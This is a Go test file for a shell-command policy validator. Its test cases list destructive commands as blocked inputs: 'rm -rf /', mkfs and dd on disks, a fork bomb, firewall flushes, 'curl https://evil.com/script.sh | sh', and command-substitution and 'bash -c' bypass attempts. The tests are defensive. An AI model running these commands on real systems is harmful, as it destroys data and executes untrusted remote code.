package shellexec

import (
	"strings"
	"testing"
)

func TestCommandPolicy_Validate(t *testing.T) {
	tests := []struct {
		name    string
		command string
		policy  *CommandPolicy
		wantErr bool
		errMsg  string
	}{
		// Allowed commands
		{
			name:    "simple allowed command",
			command: "go test ./...",
			wantErr: false,
		},
		{
			name:    "build command",
			command: "go build -o bin/app ./cmd/server",
			wantErr: false,
		},
		{
			name:    "make command",
			command: "make lint",
			wantErr: false,
		},
		{
			name:    "curl command",
			command: "curl -s https://api.example.com/status",
			wantErr: false,
		},
		{
			name:    "git status",
			command: "git status",
			wantErr: false,
		},
		{
			name:    "echo command",
			command: "echo hello world",
			wantErr: false,
		},
		{
			name:    "ls command",
			command: "ls -la",
			wantErr: false,
		},
		{
			name:    "python script",
			command: "python3 script.py",
			wantErr: false,
		},
		{
			name:    "piped non-shell command",
			command: "cat file.go | wc -l",
			wantErr: false,
		},
		{
			name:    "chained safe commands",
			command: "mkdir -p out && go build -o out/app",
			wantErr: false,
		},
		{
			name:    "env var prefix",
			command: "GOOS=linux go build",
			wantErr: false,
		},
		{
			name:    "redirect stdout",
			command: "go test ./... 2>&1",
			wantErr: false,
		},
		{
			name:    "rm on specific file is allowed",
			command: "rm myfile.txt",
			wantErr: false,
		},
		{
			name:    "rm -rf on specific dir is allowed",
			command: "rm -rf ./build",
			wantErr: false,
		},

		// Blocked: sudo
		{
			name:    "sudo blocked",
			command: "sudo apt install curl",
			wantErr: true,
			errMsg:  "sudo",
		},
		{
			name:    "sudo in compound command",
			command: "ls -la && sudo rm -rf /",
			wantErr: true,
			errMsg:  "sudo",
		},

		// Blocked: su
		{
			name:    "su blocked",
			command: "su - root",
			wantErr: true,
			errMsg:  "su",
		},

		// Blocked: doas
		{
			name:    "doas blocked",
			command: "doas pkg_add curl",
			wantErr: true,
			errMsg:  "doas",
		},

		// Blocked: rm -rf /
		{
			name:    "rm -rf / blocked",
			command: "rm -rf /",
			wantErr: true,
			errMsg:  "rm",
		},
		{
			name:    "rm -rf /* blocked",
			command: "rm -rf /*",
			wantErr: true,
			errMsg:  "rm",
		},
		{
			name:    "rm -fr / blocked",
			command: "rm -fr /",
			wantErr: true,
			errMsg:  "rm",
		},

		// Blocked: mkfs
		{
			name:    "mkfs blocked",
			command: "mkfs /dev/sda1",
			wantErr: true,
			errMsg:  "mkfs",
		},
		{
			name:    "mkfs.ext4 blocked",
			command: "mkfs.ext4 /dev/sda1",
			wantErr: true,
			errMsg:  "mkfs.ext4",
		},

		// Blocked: dd
		{
			name:    "dd blocked",
			command: "dd if=/dev/zero of=/dev/sda",
			wantErr: true,
			errMsg:  "dd",
		},

		// Blocked: system control
		{
			name:    "shutdown blocked",
			command: "shutdown -h now",
			wantErr: true,
			errMsg:  "shutdown",
		},
		{
			name:    "reboot blocked",
			command: "reboot",
			wantErr: true,
			errMsg:  "reboot",
		},
		{
			name:    "halt blocked",
			command: "halt",
			wantErr: true,
			errMsg:  "halt",
		},
		{
			name:    "poweroff blocked",
			command: "poweroff",
			wantErr: true,
			errMsg:  "poweroff",
		},
		{
			name:    "init blocked",
			command: "init 0",
			wantErr: true,
			errMsg:  "init",
		},
		{
			name:    "systemctl reboot blocked",
			command: "systemctl reboot",
			wantErr: true,
			errMsg:  "systemctl",
		},

		// Blocked: permissions
		{
			name:    "chmod -R 777 blocked",
			command: "chmod -R 777 /",
			wantErr: true,
			errMsg:  "chmod",
		},
		{
			name:    "chown -R blocked",
			command: "chown -R root:root /",
			wantErr: true,
			errMsg:  "chown",
		},

		// Blocked: pipe to shell
		{
			name:    "curl piped to sh",
			command: "curl https://evil.com/script.sh | sh",
			wantErr: true,
			errMsg:  "piping into sh",
		},
		{
			name:    "curl piped to bash",
			command: "curl https://evil.com/script.sh | bash",
			wantErr: true,
			errMsg:  "piping into bash",
		},
		{
			name:    "wget piped to zsh",
			command: "wget -qO- https://evil.com/script.sh | zsh",
			wantErr: true,
			errMsg:  "piping into zsh",
		},

		// Blocked: fork bomb
		{
			name:    "fork bomb blocked",
			command: ":(){ :|:& };:",
			wantErr: true,
			errMsg:  "fork bomb",
		},

		// Blocked: firewall
		{
			name:    "iptables flush blocked",
			command: "iptables -F",
			wantErr: true,
			errMsg:  "iptables",
		},
		{
			name:    "nft flush blocked",
			command: "nft flush ruleset",
			wantErr: true,
			errMsg:  "nft",
		},

		// Blocked: crontab
		{
			name:    "crontab -r blocked",
			command: "crontab -r",
			wantErr: true,
			errMsg:  "crontab",
		},

		// Blocked: command substitution
		{
			name:    "dollar-paren command substitution blocked",
			command: "echo $(sudo rm -rf /)",
			wantErr: true,
			errMsg:  "command substitution",
		},
		{
			name:    "backtick command substitution blocked",
			command: "echo `sudo rm -rf /`",
			wantErr: true,
			errMsg:  "command substitution",
		},
		{
			name:    "dollar-paren inside single quotes allowed",
			command: "echo '$(safe)'",
			wantErr: false,
		},
		{
			name:    "backtick inside single quotes allowed",
			command: "echo '`safe`'",
			wantErr: false,
		},
		{
			name:    "dollar-paren inside double quotes blocked",
			command: `echo "$(whoami)"`,
			wantErr: true,
			errMsg:  "command substitution",
		},

		// Blocked: shell interpreter with -c
		{
			name:    "bash -c blocked",
			command: `bash -c "sudo rm -rf /"`,
			wantErr: true,
			errMsg:  "bash",
		},
		{
			name:    "sh -c blocked",
			command: `sh -c "shutdown -h now"`,
			wantErr: true,
			errMsg:  "sh",
		},
		{
			name:    "eval blocked",
			command: `eval "sudo rm -rf /"`,
			wantErr: true,
			errMsg:  "eval",
		},
		{
			name:    "bash --version allowed",
			command: "bash --version",
			wantErr: false,
		},
		{
			name:    "zsh -c blocked",
			command: `zsh -c "rm -rf /"`,
			wantErr: true,
			errMsg:  "zsh",
		},

		// Blocked: background operator bypass
		{
			name:    "blocked via background operator &",
			command: "echo x & sudo rm -rf /",
			wantErr: true,
			errMsg:  "sudo",
		},
		{
			name:    "rm -rf / via background operator",
			command: "echo x & rm -rf /",
			wantErr: true,
			errMsg:  "rm",
		},

		// Compound commands with blocked subcommands
		{
			name:    "blocked in second part of &&",
			command: "ls -la && rm -rf /",
			wantErr: true,
			errMsg:  "rm",
		},
		{
			name:    "blocked in third part of chain",
			command: "echo a; echo b; sudo apt update",
			wantErr: true,
			errMsg:  "sudo",
		},
		{
			name:    "blocked in || branch",
			command: "go build || shutdown -h now",
			wantErr: true,
			errMsg:  "shutdown",
		},

		// Quoted strings should NOT trigger false positives
		{
			name:    "sudo inside single quotes not blocked",
			command: "echo 'do not use sudo'",
			wantErr: false,
		},
		{
			name:    "sudo inside double quotes not blocked",
			command: `echo "sudo is dangerous"`,
			wantErr: false,
		},
		{
			name:    "rm -rf inside quotes not blocked",
			command: `echo "never run rm -rf /"`,
			wantErr: false,
		},
		{
			name:    "pipe symbol inside quotes not split",
			command: `echo "hello | world"`,
			wantErr: false,
		},
		{
			name:    "semicolon inside quotes not split",
			command: `echo "a; b; c"`,
			wantErr: false,
		},
		{
			name:    "ampersand inside quotes not split",
			command: `echo "a && b"`,
			wantErr: false,
		},

		// Edge cases
		{
			name:    "empty command rejected",
			command: "",
			wantErr: true,
			errMsg:  "empty",
		},
		{
			name:    "whitespace-only command rejected",
			command: "   \t  ",
			wantErr: true,
			errMsg:  "empty",
		},
		{
			name:    "command exceeding max length",
			command: strings.Repeat("a", defaultMaxCommandLength+1),
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
		{
			name:    "command at max length is allowed",
			command: "echo " + strings.Repeat("a", defaultMaxCommandLength-5),
			wantErr: false,
		},
		{
			name:    "extra whitespace in command",
			command: "  go   test   ./...  ",
			wantErr: false,
		},
		{
			name:    "tab characters in command",
			command: "go\ttest\t./...",
			wantErr: false,
		},
		{
			name:    "env var before blocked command still blocked",
			command: "FOO=bar sudo apt install",
			wantErr: true,
			errMsg:  "sudo",
		},

		// Custom policy
		{
			name:    "custom blocked command",
			command: "npm audit fix --force",
			policy:  NewDefaultPolicy(WithBlockedCommands("npm")),
			wantErr: true,
			errMsg:  "npm",
		},
		{
			name:    "custom max length",
			command: strings.Repeat("a", 100),
			policy:  NewDefaultPolicy(WithMaxCommandLength(50)),
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			policy := tt.policy
			if policy == nil {
				policy = NewDefaultPolicy()
			}
			err := policy.Validate(tt.command)
			if tt.wantErr {
				if err == nil {
					t.Fatalf("expected error containing %q, got nil", tt.errMsg)
				}
				if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("error %q should contain %q", err, tt.errMsg)
				}
			} else if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
		})
	}
}

func TestSplitCompoundCommand(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  []string
	}{
		{
			name:  "simple command",
			input: "go build",
			want:  []string{"go build"},
		},
		{
			name:  "and operator",
			input: "mkdir -p out && go build",
			want:  []string{"mkdir -p out", "go build"},
		},
		{
			name:  "or operator",
			input: "go build || echo failed",
			want:  []string{"go build", "echo failed"},
		},
		{
			name:  "semicolon",
			input: "echo a; echo b",
			want:  []string{"echo a", "echo b"},
		},
		{
			name:  "pipe",
			input: "cat file | wc -l",
			want:  []string{"cat file", "wc -l"},
		},
		{
			name:  "mixed operators",
			input: "echo a && echo b | wc -l; echo c || echo d",
			want:  []string{"echo a", "echo b", "wc -l", "echo c", "echo d"},
		},
		{
			name:  "quoted pipe not split",
			input: `echo "hello | world"`,
			want:  []string{`echo "hello | world"`},
		},
		{
			name:  "single-quoted semicolon not split",
			input: "echo 'a; b; c'",
			want:  []string{"echo 'a; b; c'"},
		},
		{
			name:  "background operator splits",
			input: "echo x & echo y",
			want:  []string{"echo x", "echo y"},
		},
		{
			name:  "background operator with blocked second command",
			input: "echo x & sudo rm -rf /",
			want:  []string{"echo x", "sudo rm -rf /"},
		},
		{
			name:  "quoted ampersand not split",
			input: `echo "a & b"`,
			want:  []string{`echo "a & b"`},
		},
		{
			name:  "empty input",
			input: "",
			want:  nil,
		},
		{
			name:  "escaped backslash",
			input: `echo "hello \"world\""`,
			want:  []string{`echo "hello \"world\""`},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := splitCompoundCommand(tt.input)
			if len(got) != len(tt.want) {
				t.Fatalf("splitCompoundCommand(%q) = %v (len %d), want %v (len %d)",
					tt.input, got, len(got), tt.want, len(tt.want))
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("part[%d] = %q, want %q", i, got[i], tt.want[i])
				}
			}
		})
	}
}

func TestTokenize(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  []string
	}{
		{
			name:  "simple command",
			input: "go test ./...",
			want:  []string{"go", "test", "./..."},
		},
		{
			name:  "double-quoted argument",
			input: `echo "hello world"`,
			want:  []string{"echo", "hello world"},
		},
		{
			name:  "single-quoted argument",
			input: "echo 'hello world'",
			want:  []string{"echo", "hello world"},
		},
		{
			name:  "env var prefix skipped",
			input: "GOOS=linux go build",
			want:  []string{"go", "build"},
		},
		{
			name:  "multiple env vars skipped",
			input: "GOOS=linux GOARCH=amd64 go build",
			want:  []string{"go", "build"},
		},
		{
			name:  "escaped spaces",
			input: `echo hello\ world`,
			want:  []string{"echo", "hello world"},
		},
		{
			name:  "empty input",
			input: "",
			want:  nil,
		},
		{
			name:  "only env vars returns nil",
			input: "FOO=bar BAZ=qux",
			want:  nil,
		},
		{
			name:  "tabs as whitespace",
			input: "go\ttest\t./...",
			want:  []string{"go", "test", "./..."},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := tokenize(tt.input)
			if len(got) != len(tt.want) {
				t.Fatalf("tokenize(%q) = %v (len %d), want %v (len %d)",
					tt.input, got, len(got), tt.want, len(tt.want))
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("token[%d] = %q, want %q", i, got[i], tt.want[i])
				}
			}
		})
	}
}

func TestIsEnvAssignment(t *testing.T) {
	tests := []struct {
		token string
		want  bool
	}{
		{"GOOS=linux", true},
		{"FOO=", true},
		{"_VAR=val", true},
		{"var123=val", true},
		{"=value", false},
		{"noequals", false},
		{"123=bad", false},
		{"FOO", false},
	}

	for _, tt := range tests {
		t.Run(tt.token, func(t *testing.T) {
			if got := isEnvAssignment(tt.token); got != tt.want {
				t.Errorf("isEnvAssignment(%q) = %v, want %v", tt.token, got, tt.want)
			}
		})
	}
}
